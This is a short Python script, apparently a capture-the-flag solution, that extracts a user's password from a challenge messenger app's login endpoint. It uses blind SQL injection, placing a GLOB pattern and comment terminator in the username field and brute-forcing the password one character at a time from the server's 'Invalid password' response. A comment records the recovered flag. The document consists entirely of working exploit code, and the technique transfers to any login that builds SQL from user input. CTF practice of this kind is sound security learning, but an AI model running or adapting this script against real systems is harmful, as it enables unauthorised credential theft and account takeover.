import requests
from string import ascii_letters, digits
from tqdm import tqdm

SERVER = "http://localhost:5000"
SERVER = "https://0ce5d657757a5838-messenger-app.challs.ico-official.net"

def login(username, password):
    return requests.post(SERVER + "/login", data={"username": username, "password": password})

username = "Weber"
password = "ICO{" # ICO{SQLiding_1nt0_yr_Side-Ms}

while True:
    found = False
    for next_char in "!#$&()+,-./:;<=>@[]^_`{|}~" + ascii_letters + digits:
        candidate = password + next_char
        injection = f"{username}' and password glob '{candidate}*'--"
        res = login(injection, "anything")
        if "Invalid password" in res.text:
            password = candidate
            found = True
            print(password)
            break

    if not found:
        print("Couldn't find password")
        break